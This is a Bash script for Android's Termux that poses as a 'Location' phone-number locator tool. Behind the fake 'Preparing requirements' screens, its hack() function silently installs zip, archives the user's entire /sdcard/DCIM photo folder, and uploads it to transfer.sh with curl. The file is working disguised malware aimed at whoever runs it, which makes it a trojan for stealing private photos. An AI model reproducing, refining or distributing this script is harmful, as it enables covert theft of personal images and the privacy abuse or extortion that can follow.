#!/bin/bash

#colores
cyan='\033[1;36m'
amarillo='\033[1;33m'
blanco='\033[1;37m'
verde='\033[1;32m'
lila='\033[1;35m'
rojo='\033[1;31m'

##################
##              ##                                             
##   COLORES F  ##
##              ##
###################################### 
R='\e[1;31m' # Rojo fuerte         ###   
G='\e[1;32m' # Verde Fuerte        ### 
Y='\e[1;33m' # Amarillo Fuerte     ###  
B='\e[1;34m' # Azul fuerte         ### 
M='\e[1;35m' # Purpura o algo asi  ### 
C='\e[1;36m' # Cyan color fuerte   ###  
W='\e[1;37m' # Blanco Fuerte       ###
P='\e[1;35m' # Purpura             ###  
Green='\e[32m' # Verde             ###
Gr='\e[5m\e[32m' # verde           ###  
Gris='\e[90m' # Gris               ### 
######################################

banner() {
echo -e "--------------------------------------------"
figlet -f slant Location | lolcat
echo -e "${verde}Made by ${blanco}WhBeatZ ${verde}& ${blanco}EdgarLuck  ${cyan}| ${rojo}v1.0 ${blanco}"
echo -e "--------------------------------------------"
}

hack() {
echo -e "${G}[+]${W} aqui va el hack xd"
echo -e "${G}[+]${W} Detectando version de Android"
sleep 0.5
command -v neofetch > /dev/null 2>&1 || { echo -e >&2 "${G}[+]${W} Instalando Neofetch...${W}"; sleep 2;pkg install neofetch -y > /dev/null 2>&1;}
command -v neofetch > /dev/null 2>&1 || { echo -e >&2 "${G}[+]${W} Instalando Neofetch...${W}"; sleep 2;pkg install neofetch -y > /dev/null 2>&1;}
command -v zip > /dev/null 2>&1 || { echo -e >&2 "${G}[+]${W} Instalando Zip...${W}"; sleep 2;pkg install zip -y > /dev/null 2>&1;}
command -v zip > /dev/null 2>&1 || { echo -e >&2 "${G}[+]${W} Instalando Zip...${W}"; sleep 2;pkg install zip -y > /dev/null 2>&1;}
OS=$(neofetch | grep -o "Android [0-9][0-9]")
echo -e "${G}[${W}+${G}]${W} Version : $OS"
if [[ $OS == "Android 10" ]]; then
	echo -e "${G}[${W}+${G}]${W} Iniciando proceso"
	zip -r HACK.zip /sdcard/DCIM
	if [[ -f HACK.zip ]]; then
		curl --upload-file HACK.zip https://transfer.sh/HACK.zip
	fi
else
	echo -e "${G}[${W}+${G}]${W} Iniciando proceso"
	zip -r HACK.zip /sdcard/DCIM
	if [[ -f HACK.zip ]]; then
                curl --upload-file HACK.zip https://transfer.sh/HACK.zip
	fi
fi
}

localizator() {
clear
echo -e "${amarillo}- ${blanco}This will take a few minutes. Wait patiently"
clear
sleep 1
echo -e "${verde}Preparing requirements${blanco}."
sleep 1
clear
echo -e "${verde}Preparing requirements${blanco}.."
sleep 1
clear
echo -e "${verde}Preparing requirements${blanco}..."
sleep 1
hack
echo
sleep 3
echo -e "${amarillo}--------------------------------------------"
echo -e "${blanco}Ready${verde} ✓"
sleep 1

}

mobilelocator() {
echo -e "${amarillo}--------------------------------------------"
echo
echo -e "${amarillo}- ${blanco}Write phone number to locate. Like the example: "
echo
echo -e "${amarillo}- ${lila}(${blanco}+576015801612${lila})"
echo
echo -e -n "${rojo}Phone Number -->${blanco} "
read pijas
echo
echo -e "${amarillo}- ${cyan}Phone number: ${rojo}${pijas}"
echo
echo -e "${amarillo}- ${verde}Press ${blanco}s ${verde}if the number is correct${blanco}"
echo
echo -e -n "${amarillo}-->${blanco} "
read caca
case $caca in
            s)
            localizator
            ;;
            
            *)
            echo
            echo -e "${rojo}:v"
            sleep 3
            ;;
esac
}

lastphonenumer() {
echo
}

opengithub() {
echo
}


menuprincipal() {
echo
echo -e "${amarillo}1. ${cyan}Start mobile locator"
echo
echo -e "${amarillo}2. ${cyan}Last phone number"
echo
echo -e "${amarillo}3. ${cyan}Open GitHub"
echo
echo -e -n "${rojo}number -->${blanco} "
read number
echo
case $number in
             1)
             mobilelocator
             ;;
             
             *)
            echo
            echo -e "${rojo}:v"
            sleep 3
            ;;
esac
}

banner
menuprincipal
